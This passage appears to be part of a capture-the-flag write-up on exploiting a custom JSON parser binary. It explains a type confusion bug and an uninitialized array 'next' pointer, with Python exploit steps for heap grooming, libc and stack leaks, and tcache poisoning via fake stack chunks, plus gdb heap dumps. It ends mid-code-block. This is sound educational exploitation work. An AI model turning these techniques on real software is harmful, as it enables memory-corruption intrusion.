</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,64]&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We need to add one more element on there to prevent our <code>unsortedbiin</code> chunk consolidate with the top chunk. After we trigger the above script, the <code>free_value</code> function (which is called just before it end the <code>main</code> loop) will fulfill the <code>tcache</code> bins of <code>0x90</code> chunk.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; tcache
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">---------------------------------- Tcache Bins for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">tcachebins[idx=7, size=0x90, @0x55555555c0c8]: fd=0x55555555c7e0 count=7
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c7d0 , size=0x90, flags=PREV_INUSE, fd=0x55500000924c(=0x55555555c710))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c700 , size=0x90, flags=PREV_INUSE, fd=0x55500000931c(=0x55555555c640))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c630 , size=0x90, flags=PREV_INUSE, fd=0x55500000902c(=0x55555555c570))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c560 , size=0x90, flags=PREV_INUSE, fd=0x55500000919c(=0x55555555c4c0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c4b0 , size=0x90, flags=PREV_INUSE, fd=0x55500000916c(=0x55555555c430))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c420 , size=0x90, flags=PREV_INUSE, fd=0x5550000096fc(=0x55555555c3a0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c390 , size=0x90, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">gef&gt; unsorted
</span></span><span class="line"><span class="cl">---------------------------------- Unsorted Bin for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">unsorted_bin[idx=0, size=any, @0x7ffff7faccf0]: fd=0x55555555c8a0, bk=0x55555555c8a0
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c8a0 , size=0x90, flags=PREV_INUSE, fd=0x7ffff7facce0, bk=0x7ffff7facce0)
</span></span><span class="line"><span class="cl">[+] Found 1 valid chunks in unsorted bin.
</span></span><span class="line"><span class="cl">gef&gt; x/10gx 0x55555555c8a0
</span></span><span class="line"><span class="cl">0x55555555c8a0: 0x0000000000000000      0x0000000000000091
</span></span><span class="line"><span class="cl">0x55555555c8b0: 0x00007ffff7facce0      0x00007ffff7facce0
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, now we have a <code>libc</code> address in the heap. We can easiy leak this value by setting the <code>heap</code> address which point to the libc as the <code>key</code> of our inputted object. Let&rsquo;s extend our script once again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Libc leak</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x570</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">{{</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">:0</span><span class="se">}}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_libc&#39;</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span><span class="o">-</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;libc.address&#39;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have leaked the <code>libc</code> address, we will leak one more value, because this vaule will be useful later. We will leak the binary <code>stack</code> address, which is stored in the <code>environ</code> of the <code>libc</code>. We just need to repeat a similar step with the above step to leak it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak stack</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">{{</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">:0</span><span class="se">}}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_stack&#39;</span><span class="p">,</span> <span class="n">leaked_stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_stack</span> <span class="o">=</span> <span class="n">leaked_stack</span><span class="o">-</span><span class="mh">0x1138</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;buf_stack&#39;</span><span class="p">,</span> <span class="n">buf_stack</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>buf_stack</code> value that I calculate in the above script is the <code>stack</code> address of our raw input in the stack, which is defined as <code>buf</code> in the <code>main.c</code> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I found this calculation by observing the offset of the <code>buf</code> with the stored value in the <code>environ</code> inside the <code>gdb</code>. I will explain why we need the <code>buf</code> address later, but for now, we have leaked all the necessary values to proceed to the next step, which is trying to get remote code execution.</p>
<h3 id="gaining-remote-code-execution">Gaining Remote Code Execution</h3>
<p>At this moment, we need to think how to gain remote code execution. So far, we&rsquo;ve been abusing the type confusion bug that we found during our initial analysis. Now, it&rsquo;s time to abuse the second bug that we found, which is the uninitialized <code>array_t-&gt;next</code> value. To understand this bug better, let&rsquo;s try to trigger the bug and play around with it. We&rsquo;ve discussed before that the binary considered <code>[0,0</code> as a valid JSON due to the bug in <code>parse_array_element</code> function.</p>
<h4 id="reproducing-the-next-bug">Reproducing the <code>next</code> bug</h4>
<p>For those who still don&rsquo;t know why this bug can be fatal, let&rsquo;s try to send two inputs:</p>
<ul>
<li>The first one is <code>[0,0]</code>.</li>
<li>The second one is <code>[0</code>.</li>
</ul>
<p>If you try to send both of these inputs in sequence, the binary will crash during calling <code>print_value</code> for our second input. If we try to observe this in the <code>gdb</code>, we will notice that the binary try to dereference invalid address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> -&gt; 0x555555555ccf 488b4008            &lt;print_value+0x15f&gt;   mov    rax, QWORD PTR [rax + 0x8]
</span></span><span class="line"><span class="cl">    0x555555555cd3 89d6                &lt;print_value+0x163&gt;   mov    esi, edx
</span></span><span class="line"><span class="cl">    0x555555555cd5 4889c7              &lt;print_value+0x165&gt;   mov    rdi, rax
</span></span><span class="line"><span class="cl">    0x555555555cd8 e893feffff          &lt;print_value+0x168&gt;   call   0x555555555b70 &lt;print_value&gt;
</span></span><span class="line"><span class="cl">    0x555555555cdd 488b45f0            &lt;print_value+0x16d&gt;   mov    rax, QWORD PTR [rbp - 0x10]
</span></span><span class="line"><span class="cl">    0x555555555ce1 488b00              &lt;print_value+0x171&gt;   mov    rax, QWORD PTR [rax]
</span></span><span class="line"><span class="cl">----------------------------------------------------------- memory access: $rax+0x8 = 0x555000009684 ----
</span></span><span class="line"><span class="cl">[!] Cannot access memory at address 0x555000009684
</span></span></code></pre></td></tr></table>
</div>
</div><p>To analyze this further why it&rsquo;s crashed, let&rsquo;s observe the second object layout</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/30gx 0x55555555c290
</span></span><span class="line"><span class="cl">0x55555555c290: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2a0: 0x000055555555c300      0x0000000000000005
</span></span><span class="line"><span class="cl">0x55555555c2b0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2c0: 0x00005550000097bc      0x76e9d96ee6adc866
</span></span><span class="line"><span class="cl">0x55555555c2d0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2e0: 0x000000055555555c      0x76e9d96ee6adc866
</span></span><span class="line"><span class="cl">0x55555555c2f0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c300: 0x000055500000967c      0x000055555555c320
</span></span><span class="line"><span class="cl">0x55555555c310: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c320: 0x0000000000000000      0x0000000000000002
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observed that the <code>0x000055555555c300</code> represent our second input <code>array_t</code>. The last 8 bytes point to the <code>json_t</code> chunk, which is our first array element (<code>0</code>), which is a <code>T_INT</code> type. However, notied that the first 8 bytes of the chunk points to an invalid address, which is <code>0x000055500000967c</code>. This was caused because we didn&rsquo;t send the <code>]</code> char in our second input, which makes the <code>parse_array_element</code> leave the <code>next</code> pointer uninitialized instead of setting it to <code>null</code>. The <code>next</code> value still contains the old value, which is a <code>mangled</code> pointer of the <code>tcache</code> freed chunk. Because the <code>next</code> value is not <code>null</code>, the <code>print_value</code> function will think that our <code>array</code> has a next element, and when it try to dereference it to print the value, of course it will crash because it is invalid address.</p>
<h4 id="abusing-the-next-bug">Abusing the <code>next</code> bug</h4>
<p>Now that we know more about the second bug, let&rsquo;s think what we can do with this bug. One idea that we could ask is &ldquo;Is it possible for us to purposely craft the uninitialized <code>next</code> value, so that it points to our controlled input?&rdquo;.</p>
<p>The answer for this is <strong>yes</strong>. The idea is, observed that if we have a chunk just before the <code>top</code> chunk, and then during calling <code>free</code> to that specific chunk, somehow it will be put at the <code>unsorted bin</code> (either due to its huge size or the <code>tcache</code> for that chunk&rsquo;s size is already full), the <code>free</code> will consolidate the <code>freed</code> chunk with the <code>top</code> chunk. See the below illustration</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Before free:
</span></span><span class="line"><span class="cl">|-----------|
</span></span><span class="line"><span class="cl">| Chunk A   | &lt;- Let say size is 0x90
</span></span><span class="line"><span class="cl">|-----------|
</span></span><span class="line"><span class="cl">| Top Chunk | &lt;- Let say size is 0x2000
</span></span><span class="line"><span class="cl">|-----------|
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">After free:
</span></span><span class="line"><span class="cl">|-----------|
</span></span><span class="line"><span class="cl">| Top chunk | &lt;- Consolidated, and now top chunk size is 0x2090
</span></span><span class="line"><span class="cl">|-----------|
</span></span></code></pre></td></tr></table>
</div>
</div><p>What makes it perfect for us is that the consolidated chunk previous value isn&rsquo;t cleared! This means, if we later allocate a new chunk for the <code>array_t</code> element, and it used this consolidated chunk, the uninitialized value of the <code>array_t-&gt;next</code> element will be the <code>value</code> that we set before!</p>
<p>For example, let say that the chunk A that got consolidated with the <code>top</code> chunk values are all <code>0x41</code>, that means the uninitialized value of the <code>next</code> element (which allocate a new chunk by eating the <code>top</code> chunk) will be <code>0x4141414141414141</code>.</p>
<p>With this information that the uninitialized <code>next</code> element value can be controlled by us, let&rsquo;s think the next step. I decided to use this to manipulate the <code>tcache</code> freelist. The idea is I want to control the <code>next</code> element, so that:</p>
<ul>
<li><code>print_value</code> won&rsquo;t crash</li>
<li><code>free_value</code> will free our controlled fake chunks and put it in the <code>tcache</code> freelist.</li>
</ul>
<p>This is where we will use the <code>buf_stack</code> address that we&rsquo;ve leaked before. Noticed that is is very easy for us to construct fake chunks in the stack by abusing the fact that <code>fgets</code> read a huge input and it allows us to put <code>null</code> bytes on it. It&rsquo;s hard for us to construct fake chunks in the heap, because the copy operations are using <code>strndup</code>, which will stop at <code>null</code> bytes.</p>
<p>Assume that we&rsquo;re able to set the <code>next</code> value of the array to point to our <code>buf_stack</code>. <code>buf_stack</code> is controlled by us, so we can simply craft fake chunks on there to ensure that our input is a valid <code>array_t</code> objects. Not only that, remember that after <code>print_value</code> is called, <code>free_value</code> will be calle as well, where it will iterate the array (just like what <code>print_value</code> did) and free it. That means, we will have our fake chunks located in the <code>buf_stack</code> to be freed and inserted to the <code>tcache</code> bins.</p>
<p>After doing the above thing, noticed that it is very easy to poison those freed chunks. Everytime we send our raw input, it will be read to the <code>buf_stack</code>, which mean we have full control on poisoning the <code>tcache</code> freed chunks metadata.</p>
<p>To understand better, let&rsquo;s simulate the idea that I&rsquo;ve described above. Before extending our script, let&rsquo;s check the latest freelist state after our last execution (which leaked the important values).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; bins
</span></span><span class="line"><span class="cl">---------------------------------- Tcache Bins for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">tcachebins[idx=0, size=0x20, @0x55555555c090]: fd=0x55555555c550 count=7
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c540 , size=0x20, flags=PREV_INUSE, fd=0x55500000965c(=0x55555555c300))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c2f0 , size=0x20, flags=PREV_INUSE, fd=0x55500000967c(=0x55555555c320))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c310 , size=0x20, flags=PREV_INUSE, fd=0x55500000961c(=0x55555555c340))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c330 , size=0x20, flags=PREV_INUSE, fd=0x55500000963c(=0x55555555c360))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c350 , size=0x20, flags=PREV_INUSE, fd=0x5550000096dc(=0x55555555c380))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c370 , size=0x20, flags=PREV_INUSE, fd=0x5550000097bc(=0x55555555c2e0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c2d0 , size=0x20, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">tcachebins[idx=7, size=0x90, @0x55555555c0c8]: fd=0x55555555c7e0 count=7
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c7d0 , size=0x90, flags=PREV_INUSE, fd=0x55500000924c(=0x55555555c710))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c700 , size=0x90, flags=PREV_INUSE, fd=0x55500000931c(=0x55555555c640))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c630 , size=0x90, flags=PREV_INUSE, fd=0x55500000902c(=0x55555555c570))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c560 , size=0x90, flags=PREV_INUSE, fd=0x55500000919c(=0x55555555c4c0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c4b0 , size=0x90, flags=PREV_INUSE, fd=0x55500000916c(=0x55555555c430))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c420 , size=0x90, flags=PREV_INUSE, fd=0x5550000096fc(=0x55555555c3a0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c390 , size=0x90, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">[+] Found 14 valid chunks in tcache.
</span></span><span class="line"><span class="cl">----------------------------------- Fast Bins for arena &#39;main_arena&#39; -----------------------------------
</span></span><span class="line"><span class="cl">fastbins[idx=0, size=0x20, @0x7ffff7facc90]: fd=0x55555555c2b0
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c2b0 , size=0x20, flags=PREV_INUSE, fd=0x555000009c6c(=0x55555555c930))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c930 , size=0x20, flags=, fd=0x555000009c0c(=0x55555555c950))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c950 , size=0x20, flags=PREV_INUSE, fd=0x555000009d3c(=0x55555555c860))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c860 , size=0x20, flags=PREV_INUSE, fd=0x555000009ddc(=0x55555555c880))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c880 , size=0x20, flags=PREV_INUSE, fd=0x5550000092cc(=0x55555555c790))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c790 , size=0x20, flags=PREV_INUSE, fd=0x5550000092ec(=0x55555555c7b0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c7b0 , size=0x20, flags=PREV_INUSE, fd=0x55500000939c(=0x55555555c6c0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c6c0 , size=0x20, flags=PREV_INUSE, fd=0x5550000093bc(=0x55555555c6e0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c6e0 , size=0x20, flags=PREV_INUSE, fd=0x5550000090ac(=0x55555555c5f0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c5f0 , size=0x20, flags=PREV_INUSE, fd=0x55500000934c(=0x55555555c610))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c610 , size=0x20, flags=PREV_INUSE, fd=0x5550000097cc(=0x55555555c290))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c290 , size=0x20, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">[+] Found 12 valid chunks in fastbins.
</span></span><span class="line"><span class="cl">---------------------------------- Unsorted Bin for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">unsorted_bin[idx=0, size=any, @0x7ffff7faccf0]: fd=0x55555555c8a0, bk=0x55555555c8a0
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c8a0 , size=0x90, flags=PREV_INUSE, fd=0x7ffff7facce0, bk=0x7ffff7facce0)
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have 19 of <code>0x20</code> chunks (in <code>tcache</code> and <code>fastbin</code>) and we have 8 <code>0x90</code> chunks (7 in <code>tcache</code> and 1 in <code>unsortedbin</code>). Now, in order to successfully inject the <code>next</code> pointer, we need to ensure that our <code>chunk</code> which contained our target of <code>next</code> value will be placed just before the <code>top</code> chunk, and its need to have size either larger than the maximum <code>tcache</code> chunk&rsquo;s size, or have size where the <code>tcache</code> bins are already full.</p>
<p>I decided to go with the second choice, so what I did was similar to our previous step during leaking the <code>libc</code> address. First, we need to allocate 8 string element in the array, where each string has size of <code>0x80</code>. This will consume all of the <code>0x90</code> chunks that we have in the <code>bins</code>. Then, we can simply add one more element with size <code>0x86</code>, where the last <code>6</code> bytes are the value that we&rsquo;re planning to inject the <code>next</code> with. Let&rsquo;s extend our script like below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Inject next pointer</span>
</span></span><span class="line"><span class="cl"><span class="n">a_str</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;inject...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_size</span> <span class="o">=</span> <span class="mh">0x150</span>
</span></span><span class="line"><span class="cl"><span class="n">target_free</span> <span class="o">=</span> <span class="n">buf_stack</span><span class="o">+</span><span class="n">buf_size</span>
</span></span><span class="line"><span class="cl"><span class="n">inject</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x80</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_free</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">inject</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;&#34;]&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The goal here is I want to inject the <code>next</code> pointer so that it points to <code>buf_stack+0x150</code>. I&rsquo;m planning to craft my fake chunks on that area. Let see what happend in the <code>top</code> chunks after we execute the above script.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
